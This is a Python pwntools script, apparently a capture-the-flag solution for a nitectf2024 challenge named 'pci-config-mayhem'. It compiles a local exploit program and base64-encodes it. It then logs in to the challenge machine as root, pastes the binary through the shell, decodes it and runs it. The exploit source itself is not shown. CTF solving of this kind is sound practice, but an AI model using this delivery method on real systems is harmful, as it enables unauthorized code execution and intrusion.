from pwn import *

exe = './run.sh'

(host,port) = ("pci-config-mayhem.chals.nitectf2024.live",1337)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    
    elif args.RE:
        return remote(host,port,ssl=True)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

context.terminal = ["gnome-terminal", "--"]

# ====================[EXPANSIONS]=========================

se  = lambda data  : p.send(data)
sl  = lambda data  : p.sendline(data)   
sa  = lambda ip,op : p.sendafter(ip,op)
sla = lambda ip,op : p.sendlineafter(ip,op) 
rvu = lambda data  : p.recvuntil(data)
rvl = lambda       : p.recvline()
rv  = lambda nbyts : p.recv(nbyts)  
pop = lambda       : p.interactive()

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>

context.log_level = "DEBUG"

p = start()

# ================= COMPILE STUFF ================
os.system("gcc exp.c -o exp")
os.system("gzip -9 -f exp")

# ================= GET BASE64 IP ================
op = subprocess.run(["/bin/sh","-c","cat exp.gz | base64"],
                      capture_output=True,
                      text=True )
output = op.stdout

# ================= PUT STUFF OUT ================
sla(b"login: ","root")
context.log_level = "WARNING"
cmd = f"echo \"{output}\" | base64 -d > exploit.gz"
sla(b"# ",cmd.encode())
sla(b"# ",b"gzip -d exploit.gz")
sla(b"# ",b"chmod +x exploit")
sla(b"# ",b"./exploit")

pop()